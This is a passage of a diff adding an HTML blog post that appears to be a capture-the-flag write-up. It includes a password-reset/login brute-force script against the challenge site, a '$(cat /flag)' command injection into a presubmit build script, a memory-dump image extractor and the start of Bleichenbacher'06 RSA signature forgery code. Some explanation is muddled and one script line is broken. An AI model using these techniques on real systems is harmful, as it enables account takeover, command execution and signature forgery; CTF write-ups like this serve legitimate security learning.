+</span><span style="color:#6a6a6a;"> * @param {string} </span><span style="color:#b678a9;">password
+</span><span style="color:#6a6a6a;"> * @returns the user if one is found.
+</span><span style="color:#6a6a6a;"> */
+</span><span>async function </span><span style="color:#ca7473;">getUserByUsernameAndPassword </span><span>(</span><span style="color:#c59c70;">username</span><span>, </span><span style="color:#c59c70;">password</span><span>) {
+</span><span>  const </span><span style="color:#b678a9;">user </span><span style="color:#ca7473;">= await getUserByUsername</span><span>(</span><span style="color:#b678a9;">username</span><span>)
+</span><span>  </span><span style="color:#ca7473;">if </span><span>(</span><span style="color:#ca7473;">!</span><span style="color:#b678a9;">user</span><span>) </span><span style="color:#ca7473;">return </span><span style="color:#64be81;">undefined
+</span><span>
+</span><span>  const </span><span style="color:#b678a9;">hashedPassword </span><span style="color:#ca7473;">= </span><span style="color:#b678a9;">crypto</span><span>.</span><span style="color:#ca7473;">createHash</span><span>(</span><span style="color:#c59c70;">&#39;sha1&#39;</span><span>).</span><span style="color:#ca7473;">update</span><span>(</span><span style="color:#b678a9;">password</span><span>).</span><span style="color:#ca7473;">digest</span><span>(</span><span style="color:#c59c70;">&#39;base64&#39;</span><span>)
+</span><span>  </span><span style="color:#ca7473;">if </span><span>(</span><span style="color:#ca7473;">!safeEqual</span><span>(</span><span style="color:#b678a9;">user</span><span>.</span><span style="color:#b678a9;">hashedPassword</span><span>, </span><span style="color:#b678a9;">hashedPassword</span><span>)) </span><span style="color:#ca7473;">return </span><span style="color:#64be81;">undefined
+</span><span>  
+</span><span>  </span><span style="color:#ca7473;">return </span><span style="color:#b678a9;">user
+</span><span>}
+</span></code></pre>
+<p>The vulnerability is that it is not comparing the password characters, or indexes of characters. For <code>i</code> from 0 to the length of the user's hashed password,  it checks that the index of digit <code>i</code> is the same in the hashed password and the hash of the entered password.
+We can also reset <code>tin</code>'s password using </p>
+<pre data-lang="js" style="background-color:#181818;color:#c4c4c4;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#6a6a6a;">/**
+</span><span style="color:#6a6a6a;"> * Resets the password given the username.
+</span><span style="color:#6a6a6a;"> * @param {string} </span><span style="color:#b678a9;">username
+</span><span style="color:#6a6a6a;"> * @returns a boolean indicating if the reset is successful
+</span><span style="color:#6a6a6a;"> */
+</span><span>async function </span><span style="color:#ca7473;">resetPasswordByUsername </span><span>(</span><span style="color:#c59c70;">username</span><span>) {
+</span><span>  const </span><span style="color:#b678a9;">user </span><span style="color:#ca7473;">= await getUserByUsername</span><span>(</span><span style="color:#b678a9;">username</span><span>)
+</span><span>  </span><span style="color:#ca7473;">if </span><span>(</span><span style="color:#ca7473;">!</span><span style="color:#b678a9;">user</span><span>) </span><span style="color:#ca7473;">return </span><span style="color:#64be81;">false
+</span><span>
+</span><span>  </span><span style="color:#6a6a6a;">// we don&#39;t allow admins to reset passwords
+</span><span>  </span><span style="color:#ca7473;">if </span><span>(</span><span style="color:#ca7473;">!!</span><span style="color:#b678a9;">user</span><span>.</span><span style="color:#b678a9;">isAdmin</span><span>) </span><span style="color:#ca7473;">return </span><span style="color:#64be81;">false
+</span><span>
+</span><span>  const </span><span style="color:#b678a9;">password </span><span style="color:#ca7473;">= </span><span style="color:#b678a9;">crypto</span><span>.</span><span style="color:#ca7473;">randomBytes</span><span>(</span><span style="color:#6facbe;">8</span><span>).</span><span style="color:#6facbe;">toString</span><span>(</span><span style="color:#c59c70;">&#39;hex&#39;</span><span>)
+</span><span>  const </span><span style="color:#b678a9;">hashedPassword </span><span style="color:#ca7473;">= </span><span style="color:#b678a9;">crypto</span><span>.</span><span style="color:#ca7473;">createHash</span><span>(</span><span style="color:#c59c70;">&#39;sha1&#39;</span><span>).</span><span style="color:#ca7473;">update</span><span>(</span><span style="color:#b678a9;">password</span><span>).</span><span style="color:#ca7473;">digest</span><span>(</span><span style="color:#c59c70;">&#39;base64&#39;</span><span>)
+</span><span>  
+</span><span>  </span><span style="color:#b678a9;">user</span><span>.</span><span style="color:#b678a9;">hashedPassword </span><span style="color:#ca7473;">= </span><span style="color:#b678a9;">hashedPassword
+</span><span>  </span><span style="color:#ca7473;">return </span><span style="color:#64be81;">true
+</span><span>}
+</span></code></pre>
+<p>Thus, we simply need to create a password, that, after being converted to hex, hashed with SHA1 and then encoded with base64, doesn't contain digits 0 to 16 in the base64 encoded string.</p>
+<pre data-lang="python" style="background-color:#181818;color:#c4c4c4;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ca7473;">import </span><span>hashlib
+</span><span style="color:#ca7473;">from </span><span>base64 </span><span style="color:#ca7473;">import </span><span>b64encode
+</span><span style="color:#ca7473;">import </span><span>os
+</span><span style="color:#ca7473;">import </span><span>random
+</span><span style="color:#ca7473;">import </span><span>string
+</span><span>
+</span><span style="color:#ca7473;">while </span><span style="color:#64be81;">True</span><span>:
+</span><span>    data </span><span style="color:#ca7473;">= </span><span style="color:#c59c70;">&#39;&#39;</span><span>.</span><span style="color:#b678a9;">join</span><span>(random.</span><span style="color:#b678a9;">choices</span><span>(string.ascii_letters </span><span style="color:#ca7473;">+ </span><span>string.digits, </span><span style="color:#c59c70;">k</span><span style="color:#ca7473;">=</span><span style="color:#6facbe;">16</span><span>))
+</span><span>    m </span><span style="color:#ca7473;">= </span><span>hashlib.</span><span style="color:#b678a9;">sha1</span><span>()
+</span><span>    m.</span><span style="color:#b678a9;">update</span><span>(data.</span><span style="color:#b678a9;">encode</span><span>())
+</span><span>    password </span><span style="color:#ca7473;">= </span><span style="color:#b678a9;">b64encode</span><span>(m.</span><span style="color:#b678a9;">digest</span><span>())
+</span><span>    </span><span style="color:#6facbe;">print</span><span>(password)
+</span><span>    </span><span style="color:#6facbe;">print</span><span>(data)
+</span><span>    match </span><span style="color:#ca7473;">= </span><span style="color:#64be81;">False
+</span><span>    </span><span style="color:#ca7473;">for </span><span>t </span><span style="color:#ca7473;">in </span><span>[</span><span style="color:#c1bb71;">str</span><span>(i) </span><span style="color:#ca7473;">for </span><span>i </span><span style="color:#ca7473;">in </span><span style="color:#6facbe;">range</span><span>(</span><span style="color:#6facbe;">16</span><span>)]:
+</span><span>	</span><span style="color:#ca7473;">if </span><span>t.</span><span style="color:#b678a9;">encode</span><span>() </span><span style="color:#ca7473;">in </span><span>password:
+</span><span>	    match </span><span style="color:#ca7473;">= </span><span style="color:#64be81;">True
+</span><span>	    </span><span style="color:#ca7473;">break
+</span><span>    </span><span style="color:#ca7473;">if not </span><span>match:
+</span><span>	    </span><span style="color:#ca7473;">break
+</span></code></pre>
+<p>Using the following script, we obtain the password <code>JqPzxTR4xZmQkqdR</code>. We can now keep resetting the password until the password turns out to be a base64 with no digits. Only 10 of the 64 possible base64 characters are digits, so this doesn't take too long.</p>
+<pre data-lang="python" style="background-color:#181818;color:#c4c4c4;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ca7473;">import </span><span>requests
+</span><span style="color:#ca7473;">import </span><span>hashlib
+</span><span>
+</span><span>login </span><span style="color:#ca7473;">= </span><span style="color:#c59c70;">&#39;http://vrp-website-web.h4ck.ctfcompetition.com/login&#39;
+</span><span>reset </span><span style="color:#ca7473;">= </span><span style="color:#c59c70;">&#39;http://vrp-website-web.h4ck.ctfcompetition.com/reset-password&#39;
+</span><span>
+</span><span>data </span><span style="color:#ca7473;">= </span><span>{</span><span style="color:#c59c70;">&#39;username&#39;</span><span>: </span><span style="color:#c59c70;">&#39;tin&#39;</span><span>, </span><span style="color:#c59c70;">&#39;password&#39;</span><span>: </span><span style="color:#c59c70;">&#39;JqPzxTR4xZmQkqdR&#39;</span><span>}
+</span><span>rdata </span><span style="color:#ca7473;">= </span><span>{</span><span style="color:#c59c70;">&#39;username&#39;</span><span>: </span><span style="color:#c59c70;">&#39;tin&#39;</span><span>}
+</span><span>i </span><span style="color:#ca7473;">= </span><span style="color:#6facbe;">1
+</span><span style="color:#ca7473;">while </span><span style="color:#64be81;">True</span><span>:
+</span><span>    </span><span style="color:#6facbe;">print</span><span>(i)
+</span><span>    r </span><span style="color:#ca7473;">= </span><span>requests.</span><span style="color:#b678a9;">post</span><span>(login, </span><span style="color:#c59c70;">data</span><span style="color:#ca7473;">=</span><span>data)
+</span><span>    </span><span style="color:#ca7473;">if </span><span style="color:#c59c70;">&#39;Incorrect credentials&#39; </span><span style="color:#ca7473;">not in </span><span>r.text:
+</span><span>        </span><span style="color:#6facbe;">print</span><span>(r.text)
+</span><span>        </span><span style="color:#ca7473;">with </span><span style="color:#6facbe;">open</span><span>(</span><span style="color:#c59c70;">&#39;output.html&#39;</span><span>, </span><span style="color:#c59c70;">&#39;w&#39;</span><span>) </span><span style="color:#ca7473;">as </span><span>f:
+</span><span>            f.</span><span style="color:#b678a9;">write</span><span>(r.text)
+</span><span>        </span><span style="color:#6facbe;">print</span><span>(r.headers)
+</span><span>        </span><span style="color:#ca7473;">break
+</span><span>    r </span><span style="color:#ca7473;">= </span><span>requests.</span><span style="color:#b678a9;">post</span><span>(reset, </span><span style="color:#c59c70;">data</span><span style="color:#ca7473;">=</span><span>rdata)
+</span><span>    i </span><span style="color:#ca7473;">+= </span><span style="color:#6facbe;">1
+</span></code></pre>
+<p>With this exploit script, we can reset the password until our password satisfies the check done by <code>safeEqual()</code>. We log in as tin and obtain the flag.</p>
+<h2 id="ep004ch03">EP004CH03</h2>
+<p>The repository has something called pre-submit checks that can be ran with <code>git push --push-option=presubmit</code></p>
+<pre style="background-color:#181818;color:#c4c4c4;"><code><span>remote: Starting presubmit check
+</span><span>remote: Cloning into &#39;tmprepo&#39;...
+</span><span>remote: done.
+</span><span>remote: HEAD is now at 5d870ec test
+</span><span>remote: Building version v0.1.1
+</span><span>remote: ./build.sh: line 5: go: command not found
+</span><span>remote: Build server must be misconfigured again...
+</span><span>remote: Thank you for your interest, but we are no longer accepting proposals
+</span></code></pre>
+<p>Hmm, interesting, the version comes from the file <code>configure_flags.sh</code></p>
+<pre data-lang="bash" style="background-color:#181818;color:#c4c4c4;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#6a6a6a;">#!/usr/bin/env bash
+</span><span>
+</span><span style="color:#6a6a6a;"># IMPORTANT: Make sure to bump this before pushing a new binary.
+</span><span style="color:#b678a9;">VERSION</span><span style="color:#ca7473;">=</span><span style="color:#c59c70;">&quot;v0.1.1&quot;
+</span><span style="color:#b678a9;">COMMIT_HASH</span><span style="color:#ca7473;">=</span><span style="color:#c59c70;">&quot;$(</span><span style="color:#b678a9;">git</span><span style="color:#c59c70;"> rev-parse --short HEAD)&quot;
+</span><span style="color:#b678a9;">BUILD_TIMESTAMP</span><span style="color:#ca7473;">=</span><span style="color:#c59c70;">$(</span><span style="color:#b678a9;">date </span><span style="color:#c59c70;">&#39;+%Y-%m-%dT%H:%M:%S&#39;)
+</span><span>
+</span><span style="color:#b678a9;">LDFLAGS</span><span style="color:#ca7473;">=</span><span>(
+</span><span>  </span><span style="color:#c59c70;">&quot;-X &#39;main.Version=${</span><span style="color:#b678a9;">VERSION</span><span style="color:#c59c70;">}&#39;&quot;
+</span><span>  </span><span style="color:#c59c70;">&quot;-X &#39;main.CommitHash=${</span><span style="color:#b678a9;">COMMIT_HASH</span><span style="color:#c59c70;">}&#39;&quot;
+</span><span>  </span><span style="color:#c59c70;">&quot;-X &#39;main.BuildTime=${</span><span style="color:#b678a9;">BUILD_TIMESTAMP</span><span style="color:#c59c70;">}&#39;&quot;
+</span><span>)
+</span></code></pre>
+<p>If we change <code>VERSION</code> to <code>$(cat /flag)</code> and push, we obtain the flag.</p>
+<h2 id="ep005ch01">EP005CH01</h2>
+<p>We have some random <code>.bin</code> file. Hints at a 90s toy, in the videos, Natalie Silvanovich talks about hacking tamagotchi. From Natalie's repository <a href="https://github.com/natashenka/Tamagotchi-Hack">natashenka/Tamagotchi-Hack</a> we can obtain a python script that can extract images from the file that was given to us, a memory dump. </p>
+<p>I needed to apply a small change to the script to get the full flag. The solve script is as follows:</p>
+<pre data-lang="python" style="background-color:#181818;color:#c4c4c4;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ca7473;">from </span><span>PIL </span><span style="color:#ca7473;">import </span><span>Image
+</span><span>
+</span><span>f </span><span style="color:#ca7473;">= </span><span style="color:#6facbe;">open</span><span>(</span><span style="color:#c59c70;">&quot;challenge.bin&quot;</span><span>, </span><span style="color:#c59c70;">&#39;rb&#39;</span><span>)
+</span><span>
+</span><span>a </span><span style="color:#ca7473;">= </span><span>f.</span><span style="color:#b678a9;">read</span><span>()
+</span><span>s </span><span style="color:#ca7473;">= </span><span style="color:#c59c70;">&quot;&quot;
+</span><span style="color:#6a6a6a;">#offset = 0x201292
+</span><span style="color:#6a6a6a;">#offset = 0x257010
+</span><span style="color:#6a6a6a;">#offset = 0x2AB139
+</span><span>offset </span><span style="color:#ca7473;">= </span><span style="color:#6facbe;">0
+</span><span>
+</span><span>a </span><span style="color:#ca7473;">= </span><span>a[offset:]
+</span><span>
+</span><span>num </span><span style="color:#ca7473;">= </span><span style="color:#6facbe;">0
+</span><span>o </span><span style="color:#ca7473;">=  </span><span style="color:#6facbe;">0</span><span style="color:#6a6a6a;"># 0 0xaab# 0 # 0x1539
+</span><span>
+</span><span style="color:#ca7473;">while </span><span style="color:#64be81;">True</span><span>:
+</span><span>	width </span><span style="color:#ca7473;">= </span><span style="color:#6facbe;">ord</span><span>(a[o])
+</span><span>	</span><span style="color:#6a6a6a;">#//while (width == 0):
+</span><span>	</span><span style="color:#6a6a6a;">#//	o = o + 1
+</span><span>	</span><span style="color:#6a6a6a;">#//	width = ord(a[o])
+</span><span>	height </span><span style="color:#ca7473;">= </span><span style="color:#6facbe;">ord</span><span>(a[o</span><span style="color:#ca7473;">+</span><span style="color:#6facbe;">1</span><span>])
+</span><span>	</span><span style="color:#ca7473;">print </span><span>width,
+</span><span>	</span><span style="color:#ca7473;">print </span><span>height
+</span><span>	o </span><span style="color:#ca7473;">= </span><span>o </span><span style="color:#ca7473;">+ </span><span style="color:#6facbe;">2
+</span><span>	</span><span style="color:#ca7473;">if</span><span>( height </span><span style="color:#ca7473;">&gt; </span><span style="color:#6facbe;">0x60</span><span>):
+</span><span>		</span><span style="color:#ca7473;">print </span><span style="color:#c59c70;">&quot;end&quot;
+</span><span>		</span><span style="color:#ca7473;">print </span><span>o </span><span style="color:#ca7473;">+ </span><span>offset
+</span><span>		</span><span style="color:#ca7473;">break
+</span><span>	extra </span><span style="color:#ca7473;">= </span><span style="color:#6facbe;">0
+</span><span>	</span><span style="color:#ca7473;">if</span><span>( height </span><span style="color:#ca7473;">&gt; </span><span style="color:#6facbe;">0x60</span><span>):
+</span><span>		</span><span style="color:#ca7473;">print </span><span style="color:#c59c70;">&quot;end&quot;
+</span><span>		</span><span style="color:#ca7473;">print </span><span>o </span><span style="color:#ca7473;">+ </span><span>offset
+</span><span>		</span><span style="color:#ca7473;">break
+</span><span>	</span><span style="color:#ca7473;">if </span><span>((width) </span><span style="color:#ca7473;">% </span><span style="color:#6facbe;">4 </span><span style="color:#ca7473;">!= </span><span style="color:#6facbe;">0</span><span>):
+</span><span>		</span><span style="color:#ca7473;">while </span><span>((width) </span><span style="color:#ca7473;">% </span><span style="color:#6facbe;">4 </span><span style="color:#ca7473;">!= </span><span style="color:#6facbe;">0</span><span>):
+</span><span>			width </span><span style="color:#ca7473;">= </span><span>width </span><span style="color:#ca7473;">+ </span><span style="color:#6facbe;">1
+</span><span>	</span><span style="color:#ca7473;">if </span><span>((height) </span><span style="color:#ca7473;">%</span><span> 4if </span><span style="color:#ca7473;">!= </span><span style="color:#6facbe;">0</span><span>):
+</span><span>		</span><span style="color:#6a6a6a;">#for t in range(0, (height) % 4):
+</span><span>		</span><span style="color:#6a6a6a;">#height  = height + 1
+</span><span>
+</span><span>		</span><span style="color:#ca7473;">print </span><span style="color:#c59c70;">&quot;Padded to &quot; </span><span style="color:#ca7473;">+ </span><span style="color:#c1bb71;">str</span><span>(width) </span><span style="color:#ca7473;">+ </span><span style="color:#c59c70;">&quot; by &quot; </span><span style="color:#ca7473;">+ </span><span style="color:#c1bb71;">str</span><span>(height)
+</span><span>	s </span><span style="color:#ca7473;">= </span><span style="color:#c59c70;">&quot;&quot;
+</span><span>	</span><span style="color:#ca7473;">for </span><span>i </span><span style="color:#ca7473;">in </span><span style="color:#6facbe;">range</span><span>(</span><span style="color:#6facbe;">0</span><span>, height</span><span style="color:#ca7473;">*</span><span>width</span><span style="color:#ca7473;">/</span><span style="color:#6facbe;">4 </span><span style="color:#ca7473;">+ </span><span style="color:#6facbe;">1</span><span>):
+</span><span>		</span><span style="color:#ca7473;">for </span><span>j </span><span style="color:#ca7473;">in </span><span style="color:#6facbe;">range</span><span>(</span><span style="color:#6facbe;">0</span><span>, </span><span style="color:#6facbe;">4</span><span>):
+</span><span>			</span><span style="color:#6a6a6a;">#print ord(a[i])
+</span><span>			</span><span style="color:#6a6a6a;">#print (0x03 &lt;&lt; ((3- j)*2))
+</span><span>			</span><span style="color:#ca7473;">print </span><span style="color:#6facbe;">len</span><span>(a), i, o, i</span><span style="color:#ca7473;">+</span><span>o
+</span><span>			</span><span style="color:#ca7473;">if </span><span>i</span><span style="color:#ca7473;">+</span><span>o </span><span style="color:#ca7473;">&gt;= </span><span style="color:#6facbe;">len</span><span>(a): </span><span style="color:#ca7473;">break
+</span><span>			k </span><span style="color:#ca7473;">= </span><span style="color:#6facbe;">ord</span><span>(a[i</span><span style="color:#ca7473;">+</span><span>o]) </span><span style="color:#ca7473;">&amp; </span><span>(</span><span style="color:#6facbe;">0x03 </span><span style="color:#ca7473;">&lt;&lt; </span><span>((</span><span style="color:#6facbe;">3</span><span style="color:#ca7473;">- </span><span>j)</span><span style="color:#ca7473;">*</span><span style="color:#6facbe;">2</span><span>))
+</span><span>
+</span><span>			l </span><span style="color:#ca7473;">= </span><span>((k) </span><span style="color:#ca7473;">&gt;&gt; </span><span>((</span><span style="color:#6facbe;">3</span><span style="color:#ca7473;">-</span><span>j)</span><span style="color:#ca7473;">*</span><span style="color:#6facbe;">2</span><span>))
+</span><span>		
+</span><span>			s </span><span style="color:#ca7473;">= </span><span>s </span><span style="color:#ca7473;">+ </span><span style="color:#6facbe;">chr</span><span>(</span><span style="color:#6facbe;">0xFF</span><span style="color:#ca7473;">&amp;</span><span>(</span><span style="color:#ca7473;">~</span><span>(l</span><span style="color:#ca7473;">*</span><span>(</span><span style="color:#6facbe;">255</span><span style="color:#ca7473;">/</span><span style="color:#6facbe;">4</span><span>))))
+</span><span>	o </span><span style="color:#ca7473;">= </span><span>o </span><span style="color:#ca7473;">+ </span><span>height</span><span style="color:#ca7473;">*</span><span>width</span><span style="color:#ca7473;">/</span><span style="color:#6facbe;">4
+</span><span>	</span><span style="color:#6a6a6a;">#print s
+</span><span>	</span><span style="color:#6a6a6a;"># fromstring
+</span><span>	image </span><span style="color:#ca7473;">= </span><span>Image.</span><span style="color:#b678a9;">frombytes</span><span>(
+</span><span>        </span><span style="color:#c59c70;">&quot;L&quot;</span><span>, (width, height), s, </span><span style="color:#c59c70;">&quot;raw&quot;</span><span>, 
+</span><span>        </span><span style="color:#c59c70;">&quot;L&quot;
+</span><span>        )
+</span><span>	</span><span style="color:#ca7473;">print </span><span style="color:#c59c70;">&quot;img &quot; </span><span style="color:#ca7473;">+ </span><span style="color:#c1bb71;">str</span><span>(num) </span><span style="color:#ca7473;">+ </span><span style="color:#c59c70;">&quot; at &quot; </span><span style="color:#ca7473;">+ </span><span style="color:#c1bb71;">str</span><span>(o)
+</span><span>	image.</span><span style="color:#b678a9;">save</span><span>(</span><span style="color:#c59c70;">&quot;/data/im-&quot; </span><span style="color:#ca7473;">+ </span><span style="color:#c1bb71;">str</span><span>(num) </span><span style="color:#ca7473;">+ </span><span style="color:#c59c70;">&quot;.bmp&quot;</span><span>)
+</span><span>	num </span><span style="color:#ca7473;">= </span><span>num </span><span style="color:#ca7473;">+ </span><span style="color:#6facbe;">1
+</span></code></pre>
+<p>With this, we get images that spell out the flag.</p>
+<h2 id="ep005ch02">EP005CH02</h2>
+<p>I wish I had the time to prepare a proper writeup for this attack, it was a lot of fun. 
+This was a really fun challenge, a tricky case of Bleichenbacher'06. Unfortunately I am really pressed for time right now, but the following two links should give a good introduction to the BB'06 attack.</p>
+<p>This writeup is heavily adapted from <a href="https://words.filippo.io/bleichenbacher-06-signature-forgery-in-python-rsa/">Filippo Valsorda's writeup</a>.</p>
+<p>Here's another useful <a href="https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE/">post</a> on the topic, by Hal Finney.</p>
+<p>Here's a useful video on the topic, from BlackHat: <a href="https://www.youtube.com/watch?v=2xspZfXI_nY">A Decade After Bleichenbacher '06, RSA Signature Forgery Still Works</a>.</p>
+<p>The tricky bit in this challenge is finding where we can put garbage. </p>
+<p>The padding is correctly validated, the application ensures the padding is FF bytes.</p>
+<pre data-lang="python" style="background-color:#181818;color:#c4c4c4;" class="language-python "><code class="language-python" data-lang="python"><span>padding, digest_info </span><span style="color:#ca7473;">= </span><span>k[</span><span style="color:#6facbe;">2</span><span>:].</span><span style="color:#b678a9;">split</span><span>(b</span><span style="color:#c59c70;">&#39;</span><span style="color:#64be81;">\x00</span><span style="color:#c59c70;">&#39;</span><span>, </span><span style="color:#6facbe;">1</span><span>)
+</span><span>
+</span><span style="color:#ca7473;">if </span><span style="color:#6facbe;">len</span><span>(padding) </span><span style="color:#ca7473;">&lt; </span><span style="color:#6facbe;">8</span><span>:
+</span><span>    </span><span style="color:#ca7473;">raise </span><span style="color:#c1bb71;">Exception</span><span>(</span><span style="color:#c59c70;">&#39;invalid padding length&#39;</span><span>)
+</span><span style="color:#ca7473;">if </span><span>padding </span><span style="color:#ca7473;">!= </span><span>b</span><span style="color:#c59c70;">&#39;</span><span style="color:#64be81;">\xff</span><span style="color:#c59c70;">&#39;</span><span style="color:#ca7473;">*</span><span style="color:#6facbe;">len</span><span>(padding):
+</span><span>    </span><span style="color:#ca7473;">raise </span><span style="color:#c1bb71;">Exception</span><span>(</span><span style="color:#c59c70;">&#39;invalid padding content&#39;</span><span>)
+</span></code></pre>
+<p>However, in the DER sequence parsing part, we can fit garbage:</p>
+<pre data-lang="python" style="background-color:#181818;color:#c4c4c4;" class="language-python "><code class="language-python" data-lang="python"><span>sequence </span><span style="color:#ca7473;">= </span><span style="color:#b678a9;">DerSequence</span><span>()
+</span><span>sequence.</span><span style="color:#b678a9;">decode</span><span>(digest_info)
+</span><span>_digest_algorithm_identifier, _digest </span><span style="color:#ca7473;">= </span><span>sequence
+</span><span>
+</span><span>sequence </span><span style="color:#ca7473;">= </span><span style="color:#b678a9;">DerSequence</span><span>()
+</span><span>sequence.</span><span style="color:#b678a9;">decode</span><span>(_digest_algorithm_identifier)
+</span><span>_digest_algorithm_identifier </span><span style="color:#ca7473;">= </span><span>sequence[</span><span style="color:#6facbe;">0</span><span>]
+</span><span>
+</span><span>object_id </span><span style="color:#ca7473;">= </span><span style="color:#b678a9;">DerObjectId</span><span>()
+</span><span>object_id.</span><span style="color:#b678a9;">decode</span><span>(_digest_algorithm_identifier)
+</span><span>digest_algorithm_identifier </span><span style="color:#ca7473;">= </span><span>object_id.value
+</span><span style="color:#ca7473;">if </span><span>digest_algorithm_identifier </span><span style="color:#ca7473;">!= </span><span style="color:#c59c70;">&#39;2.16.840.1.101.3.4.2.1&#39;</span><span>:
+</span><span>    </span><span style="color:#ca7473;">raise </span><span style="color:#c1bb71;">Exception</span><span>(</span><span style="color:#c59c70;">&#39;invalid digest algorithm identifier&#39;</span><span>)
+</span><span>
+</span><span>_null </span><span style="color:#ca7473;">= </span><span>sequence[</span><span style="color:#6facbe;">1</span><span>]
+</span><span>null </span><span style="color:#ca7473;">= </span><span style="color:#b678a9;">DerNull</span><span>()
+</span><span>null.</span><span style="color:#b678a9;">decode</span><span>(_null)
+</span><span>
+</span><span>octet_string </span><span style="color:#ca7473;">= </span><span style="color:#b678a9;">DerOctetString</span><span>()
+</span><span>octet_string.</span><span style="color:#b678a9;">decode</span><span>(_digest)
+</span><span>digest </span><span style="color:#ca7473;">= </span><span>octet_string.payload
+</span></code></pre>
+<p>Since the length of the <code>_digest_algorithm_identifier</code> sequence is never checked, we can hide something after the DerNull in the sequence. This is a bit tricky, since DerSequences (and DerOctetStrings) declare their length at the beginning of the DER representation. For example, in the representation of</p>
+<pre data-lang="python" style="background-color:#181818;color:#c4c4c4;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b678a9;">DerOctetString</span><span>(b</span><span style="color:#c59c70;">&#39;hello!&#39;</span><span>).</span><span style="color:#b678a9;">encode</span><span>()
+</span><span>b</span><span style="color:#c59c70;">&#39;</span><span style="color:#64be81;">\x04\x06</span><span style="color:#c59c70;">hello!&#39;
+</span></code></pre>
+<p>'\x06' denotes the length of the string 'hello!'. If the lengths are wrong, the parsing will fail, as it might e.g. read only 4 bytes of 'hello!' and expect 'o!' to be the header for the next part of the DER sequence, or it might think it's done reading the whole DER sequence before all your data is consumed.</p>
+<p>To start off, we need some functions from Filippo Valsorda's writeup: </p>
+<pre data-lang="python" style="background-color:#181818;color:#c4c4c4;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ca7473;">from </span><span>Crypto.Util.asn1 </span><span style="color:#ca7473;">import </span><span>DerSequence, DerObjectId, DerOctetString, DerNull
+</span><span style="color:#ca7473;">from </span><span>gmpy2 </span><span style="color:#ca7473;">import </span><span>mpz, iroot, powmod, mul, t_mod
+</span><span style="color:#ca7473;">import </span><span>hashlib
+</span><span style="color:#ca7473;">import </span><span>json
+</span><span style="color:#ca7473;">import </span><span>binascii
+</span><span>
+</span><span style="color:#6a6a6a;"># to_bytes(), from_bytes(), get_bit(), set_bit() and cube_root() taken from Filippo Valsorda&#39;s post. 
+</span><span>
+</span><span style="color:#ca7473;">def to_bytes</span><span>(</span><span style="color:#c59c70;">n</span><span>):
+</span><span>    </span><span style="color:#6a6a6a;">&quot;&quot;&quot; Return a bytes representation of a int &quot;&quot;&quot;
+</span><span>    </span><span style="color:#ca7473;">return </span><span>n.</span><span style="color:#b678a9;">to_bytes</span><span>((n.</span><span style="color:#b678a9;">bit_length</span><span>() </span><span style="color:#ca7473;">// </span><span style="color:#6facbe;">8</span><span>) </span><span style="color:#ca7473;">+ </span><span style="color:#6facbe;">1</span><span>, </span><span style="color:#c59c70;">byteorder</span><span style="color:#ca7473;">=</span><span style="color:#c59c70;">&#39;big&#39;</span><span>)
+</span><span>
+</span><span style="color:#ca7473;">def from_bytes</span><span>(</span><span style="color:#c59c70;">b</span><span>):
+</span><span>    </span><span style="color:#6a6a6a;">&quot;&quot;&quot; Makes a int from a bytestring &quot;&quot;&quot;
+</span><span>    </span><span style="color:#ca7473;">return </span><span style="color:#c1bb71;">int</span><span>.</span><span style="color:#b678a9;">from_bytes</span><span>(b, </span><span style="color:#c59c70;">byteorder</span><span style="color:#ca7473;">=</span><span style="color:#c59c70;">&#39;big&#39;</span><span>)
+</span><span>
+</span><span style="color:#ca7473;">def get_bit</span><span>(</span><span style="color:#c59c70;">n</span><span>, </span><span style="color:#c59c70;">b</span><span>):
+</span><span>    </span><span style="color:#6a6a6a;">&quot;&quot;&quot; Returns the b-th rightmost bit of n &quot;&quot;&quot;
+</span><span>    </span><span style="color:#ca7473;">return </span><span>((</span><span style="color:#6facbe;">1 </span><span style="color:#ca7473;">&lt;&lt; </span><span>b) </span><span style="color:#ca7473;">&amp; </span><span>n) </span><span style="color:#ca7473;">&gt;&gt; </span><span>b
+</span><span>
+</span><span style="color:#ca7473;">def set_bit</span><span>(</span><span style="color:#c59c70;">n</span><span>, </span><span style="color:#c59c70;">b</span><span>, </span><span style="color:#c59c70;">x</span><span>):
+</span><span>    </span><span style="color:#6a6a6a;">&quot;&quot;&quot; Returns n with the b-th rightmost bit set to x &quot;&quot;&quot;
+</span><span>    </span><span style="color:#ca7473;">if </span><span>x </span><span style="color:#ca7473;">== </span><span style="color:#6facbe;">0</span><span>: </span><span style="color:#ca7473;">return ~</span><span>(</span><span style="color:#6facbe;">1 </span><span style="color:#ca7473;">&lt;&lt; </span><span>b) </span><span style="color:#ca7473;">&amp; </span><span>n
+</span><span>    </span><span style="color:#ca7473;">if </span><span>x </span><span style="color:#ca7473;">== </span><span style="color:#6facbe;">1</span><span>: </span><span style="color:#ca7473;">return </span><span>(</span><span style="color:#6facbe;">1 </span><span style="color:#ca7473;">&lt;&lt; </span><span>b) </span><span style="color:#ca7473;">| </span><span>n
+</span><span>
+</span><span style="color:#ca7473;">def cube_root</span><span>(</span><span style="color:#c59c70;">n</span><span>):
+</span><span>    </span><span style="color:#ca7473;">return </span><span style="color:#c1bb71;">int</span><span>(</span><span style="color:#b678a9;">iroot</span><span>(</span><span style="color:#b678a9;">mpz</span><span>(n), </span><span style="color:#6facbe;">3</span><span>)[</span><span style="color:#6facbe;">0</span><span>])
+</span></code></pre>
+<p>and we also use Filippo's method for generating the suffix. </p>
+<pre data-lang="python" style="background-color:#181818;color:#c4c4c4;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#6a6a6a;"># find a number that, once cube rooted, ends with the digest_info DER sequence.
+</span><span style="color:#ca7473;">def gen_suffix</span><span>(</span><span style="color:#c59c70;">target_suffix</span><span>):
+</span><span>    sig_suffix </span><span style="color:#ca7473;">= </span><span style="color:#6facbe;">1
+</span><span>    </span><span style="color:#ca7473;">for </span><span>b </span><span style="color:#ca7473;">in </span><span style="color:#6facbe;">range</span><span>(</span><span style="color:#6facbe;">len</span><span>(target_suffix)</span><span style="color:#ca7473;">*</span><span style="color:#6facbe;">8</span><span>):
